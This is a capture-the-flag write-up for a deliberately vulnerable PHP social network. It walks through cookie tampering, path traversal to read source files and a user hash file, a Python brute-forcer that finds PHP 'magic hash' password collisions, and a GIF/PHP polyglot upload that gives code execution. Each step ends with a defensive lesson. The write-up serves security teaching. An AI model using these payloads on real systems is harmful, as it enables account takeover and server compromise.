# Thinkr CTF — Full Writeup

*"Your thoughts, disordered."*

Thinkr is a small PHP social network where users post "thoughts" that are displayed in random order. It's in invite-only beta. There are 5 flags hidden across the application, each requiring a different web exploitation technique. Here's how to find them all.

---

## Flag 1 — View Source

**`flag{3nt3r-th3-m@tr1><}`**

This one's a freebie to get you warmed up.

When you first visit the site, you land on `/signin.php`. Before doing anything fancy, do what you should always do first in a web CTF: **view the page source**.

```html
<!-- flag{3nt3r-th3-m@tr1><} -->
<html>
  <head>
    <title>Sign in | Thinkr</title>
    ...
```

An HTML comment right at the top of the page. The flag is in a shared header template, so it appears on every single page — you literally cannot miss it if you check the source.

**Lesson:** Always view source. Always check comments. Developers leave things behind.

---

## Flag 2 — Cookie Monster

**`flag{nOm-n0M-t@st1e-c00K13}`**

The signin page has a link: *"Don't have an account? Get one!"* — but clicking it redirects you straight back to `/beta.php`, which says Thinkr is invite-only and you need a referral.

Open your browser's developer tools and look at the cookies. You'll see one that was just set:

```
has_referral=0
```

That's... suspicious. What if we change it?

```
has_referral=1
```

Refresh, click the signup link again, and this time you land on `/signup.php`. The page loads with a signup form and, sitting right below it in a `<pre>` tag:

```
flag{nOm-n0M-t@st1e-c00K13}
```

The entire "invite-only beta" access control was a single client-side cookie. The server trusted whatever value your browser sent.

**Lesson:** Never trust the client. Cookies, hidden form fields, and HTTP headers are all attacker-controlled. Authorization decisions must happen server-side.

---

## Interlude — Getting Inside

Now we can sign up and log in. But the app tells us our account needs admin approval before we can post thoughts or upload photos ("This can take 2-4 days"). We're an **unverified** user.

What *can* we do? We can browse the home page, which shows random thoughts from other users (animals like `cat`, `elephant`, `zebra`...), and click through to read individual thoughts at URLs like:

```
/read.php?thought=a8f5f167f44f4964e6c998dee827110c
```

Those thought IDs look like MD5 hashes. And they're being passed directly as a GET parameter. That's the most interesting attack surface we've seen so far.

---

## Flag 5 — Path Traversal

**`flag{[_[_t3LeP@thy-1ntEn5if13s_]_]}`**

### Step 1: Try SQL injection (and fail instructively)

The `thought` parameter is pulling data from somewhere using what looks like a hash as a key. Our first instinct: maybe it's a database query? Let's try SQL injection. We take one of the thought URLs and append a classic payload:

```
/read.php?thought=a8f5f167f44f4964e6c998dee827110c' OR 1=1 --
```

We get an error, but not the SQL error we expected:

```
ID exceeds maximum length
```

Interesting. It's treating the input as an "ID" with a length limit — that doesn't sound like SQL at all. The existing thought IDs are 32-character hex strings, so maybe the limit is 32. Let's try a shorter payload — just replace the ID entirely:

```
/read.php?thought=test
```

A different error this time, and it's a goldmine:

```
Could not find storage at /var/www/html/data/Thought/test
```

The application just told us:

1. **There is no database.** It's using the filesystem to store thoughts as individual files.
2. **The full path** to where thoughts are stored: `/var/www/html/data/Thought/`
3. **Our input is concatenated directly into a file path** with no sanitization.

SQL injection is off the table, but something even better just opened up: **path traversal**.

### Step 2: Read source code

If thoughts live at `/var/www/html/data/Thought/[id]`, then `../` takes us up to `/var/www/html/data/`, and `../../` takes us to `/var/www/html/` — the web root where all the PHP files live.

Let's read the application's own source code:

```
/read.php?thought=../../read.php
```

And there it is — the raw PHP source of `read.php` displayed right on the page. We can now read any file on the server (within a 32-character path length limit, but that's plenty).

Let's read the files it references. At the top of `read.php` we see:

```php
require_once('storage/thought.php');
require_once('storage/user_thought.php');
require_once('storage/user.php');
```

Let's read the user storage code:

```
/read.php?thought=../../storage/user.php
```

This reveals the `User` class extends `CSVModel`. Let's read that too:

```
/read.php?thought=../../storage/csvmodel.php
```

And there's the key line — CSVModel stores its data at:

```php
static function getStorage() {
    return "/var/www/html/data/".static::class.".csv";
}
```

So the `User` class stores everything in `/var/www/html/data/User.csv`. Since we're already traversing from `/var/www/html/data/Thought/`, that's just one directory up:

### Step 3: Dump the user database

```
/read.php?thought=../User.csv
```

The entire user database spills onto the page:

```
FLAG,,flag{[_[_t3LeP@thy-1ntEn5if13s_]_]},true,
ant,rnf9,4aa322be200aa5d1e2be915268d572e6,true,
bull,88rw,7676e66322af43795d3e30b623499e48,true,
cat,7bqa,cf52ee958dea0b0baafb539c4eaebb37,true,
dog,7n3g,45713d9403a6f9420b279453a4c2accd,true,
elephant,vunp,0e612198634316944013585621061115,true,
fox,jfx7,26025af32166cbb306a8c0dba4b4df00,true,
...
zebra,uk0q,77aeef2799d85ecd68c3f38d372335f0,true,
```

The format is `username, salt, hash, verified, photo`. And right there on the first line — a user called `FLAG` whose "hash" field is actually the flag itself.

That's **flag 5**: the reward for successfully reading the user database.

### Step 4: Discover the flags directory (but can't reach it)

While exploring source files, you'll notice most of them `require_once('config.php')`. Naturally, we read that too:

```
/read.php?thought=../../config.php
```

This reveals:

```php
$GLOBALS['FLAGS_DIR'] = 'flagsflagsflagsflagsflagsflagsflagsflags';
```

So flags are stored in the filesystem, just like everything else — as files inside a directory with a long, obscure name. Can we traverse directly to them? The path from `/var/www/html/data/Thought/` would be:

```
../../flagsflagsflagsflagsflagsflagsflagsflags/flag4
```

Count the characters: **52**. That's well over the 32-character ID limit. The directory name isn't long by accident — it's a deliberate defense that makes the path too long for our traversal exploit. We can *see* where the flags are, but we can't *reach* them this way. We'll need code execution for that.

**Lesson:** When a web app passes filenames or IDs as parameters, always try path traversal (`../`). And when your injection attempts produce error messages, *read them carefully* — even a "failed" attack can leak critical information about the application's internals.

---

## Flag 3 — PHP Type Juggling

**`flag{fl0@t-l1k3-A-5tR1n9}`**

This is the hardest flag in the challenge. It requires chaining together what we learned from reading the source code and the user database.

### Step 1: Spot the vulnerability in source code

When we read `user.php` via our path traversal earlier, one thing should have jumped out:

```php
function checkPassword($pw) {
    $hash = static::getHash($this->getField('salt'), $pw);
    if ($hash == $this->getField('hash')) {
        return TRUE;
    }
    return FALSE;
}
```

See it? The comparison operator is `==`, not `===`.

In PHP, `==` is the *loose comparison* operator. It tries to be "helpful" by converting values before comparing them. `===` is *strict comparison* — it compares the raw string values byte-by-byte.

For password hash comparison, `==` is dangerous. Here's why.

### Step 2: Understand the exploit

PHP's loose comparison has a quirk: if two strings both look like numbers in scientific notation, PHP converts them to floats before comparing. The string:

```
"0e612198634316944013585621061115"
```

...looks like `0 × 10^612198634316944013585621061115` to PHP. That evaluates to the float **0.0**.

So if both the stored hash and our computed hash are strings matching `0e[digits only]`, PHP compares them as `0.0 == 0.0`, which is `true` — regardless of whether the actual hash values match.

### Step 3: Find the target

Now go back and look at the user database we dumped. We need a user whose stored hash matches the pattern `0e[only digits]`:

```
elephant,vunp,0e612198634316944013585621061115,true,
```

Elephant's hash starts with `0e` and the rest is all digits. That means *any* password that also produces a `0e[digits]` hash (with elephant's salt `vunp`) will pass the check.

### Step 4: Find a colliding password

We know from the source that passwords are hashed as `md5(salt + password)`. We need to brute-force a password `P` where:

```
md5("vunp" + P) matches /^0e[0-9]+$/
```

This pattern is rare — only 1 in 340,282,367 MD5 hashes qualify — so brute-force search needs many guesses. The right approach is random sampling across multiple processes, since every guess is independent:

```python
import hashlib, random, string, multiprocessing, os

salt = "vunp"
charset = string.ascii_lowercase + string.digits

def worker(id):
    attempts = 0
    while True:
        password = ''.join(random.choices(charset, k=8))
        h = hashlib.md5((salt + password).encode()).hexdigest()
        attempts += 1
        if h.startswith("0e") and h[2:].isdigit():
            print(f"Found! password={password}  hash={h}")
            os._exit(0)

if __name__ == "__main__":
    for i in range(8):
        multiprocessing.Process(target=worker, args=(i,)).start()
```

With 8 workers this takes a few minutes. For example, password `5nszjp2c` produces hash `0e213581143648196021608869553810` — a match.

### Step 5: Log in

- **Username:** `elephant`
- **Password:** `5nszjp2c` *(or whatever your script found)*

It works! And crucially, elephant is a **verified** user. The home page now shows a new section at the bottom that unverified users never see:

```
flag{fl0@t-l1k3-A-5tR1n9}
```

**Lesson:** In PHP, `==` is almost never what you want for security comparisons. Always use `===` or `hash_equals()`. This class of vulnerability is called "type juggling" and the `0e` pattern is known as a "magic hash." It's one of the most famous PHP-specific vulnerabilities.

---

## Flag 4 — Unrestricted File Upload to RCE

**`flag{1M4G3-1N3-th3-p0S51b1Lit1ES}`**

### Reconnaissance

Now that we're logged in as elephant (a verified user), we have access to two features our unverified account couldn't use: posting thoughts and uploading a profile photo ("Personalize"). The photo upload is at `/photo.php`.

We can read the source code using our path traversal:

```
/read.php?thought=../../photo.php
```

From reading the source, we learn:

1. The file is validated with `getimagesize()` — it must have valid image headers
2. File size must be under 500KB
3. The file must not already exist at the target path
4. The file is saved to `uploads/` using the **original filename** from the upload
5. **There is no file extension check**

That last point is critical. The server checks that the uploaded file looks like an image, but it doesn't care if the filename ends in `.php`. And Apache will happily execute any `.php` file, regardless of what's inside it beyond the PHP tags.

### Finding the flag location

We already know from reading `config.php` earlier that flags live in a directory called `flagsflagsflagsflagsflagsflagsflagsflags/`. The path was too long for our traversal exploit — but with code execution, there's no such limitation.

### Crafting the polyglot

We need a file that:
- Passes `getimagesize()` (valid image headers)
- Contains PHP code that will execute
- Has a `.php` extension

This is called a **polyglot** — a file that is simultaneously valid in two formats. The simplest approach: a GIF header followed by PHP code.

```bash
printf 'GIF89a<?php echo file_get_contents("flagsflagsflagsflagsflagsflagsflagsflags/flag4"); ?>' > exploit.php
```

`GIF89a` is the magic bytes for a GIF image — just six characters, but enough for `getimagesize()` to recognize it as a valid image. Apache, on the other hand, sees the `.php` extension and runs it through the PHP interpreter, which finds and executes the `<?php ... ?>` block.

### Pulling the trigger

1. Go to `/photo.php`
2. Upload `exploit.php` as your profile photo
3. Visit `/uploads/exploit.php` in your browser
4. The page displays:

```
flag{1M4G3-1N3-th3-p0S51b1Lit1ES}
```

We now have arbitrary code execution on the server. Game over.

**Lesson:** `getimagesize()` is not a security function. Validating that a file "is an image" does not make it safe to store with a user-controlled filename and extension. Secure file uploads must: (1) whitelist allowed extensions, (2) generate server-side filenames, and (3) ideally store uploads outside the web root or serve them through a handler that sets `Content-Type` and `Content-Disposition` headers.

---

## Summary

| # | Flag | Technique | Difficulty |
|---|------|-----------|------------|
| 1 | `flag{3nt3r-th3-m@tr1><}` | View HTML source | Trivial |
| 2 | `flag{nOm-n0M-t@st1e-c00K13}` | Cookie manipulation | Easy |
| 5 | `flag{[_[_t3LeP@thy-1ntEn5if13s_]_]}` | Path traversal / file read | Medium |
| 3 | `flag{fl0@t-l1k3-A-5tR1n9}` | PHP type juggling (`==` vs `===`) | Hard |
| 4 | `flag{1M4G3-1N3-th3-p0S51b1Lit1ES}` | Unrestricted upload / RCE | Medium-Hard |

### The Attack Chain

Each flag chains into the next:

1. **View source** gets you oriented.
2. **Cookie bypass** gets you an account.
3. **SQL injection attempt** fails but leaks the filesystem path, revealing the app uses file-based storage.
4. **Path traversal** lets you read source code, which leads you to `User.csv`.
5. **Reading User.csv** gives you the flag 5 and all the password hashes.
6. **Reading the source code** reveals the `==` comparison bug. Cross-referencing with the hashes, you find elephant's `0e` hash is exploitable.
7. **Logging in as elephant** (verified) unlocks the file upload.
8. **Uploading a PHP polyglot** gives you code execution and the final flag.

The intended difficulty curve goes: *easy warm-up → medium exploitation → hard crypto/logic → back to medium for the satisfying finale.* Every vulnerability is realistic — these are all mistakes that show up in real production PHP code.

Thanks for playing!
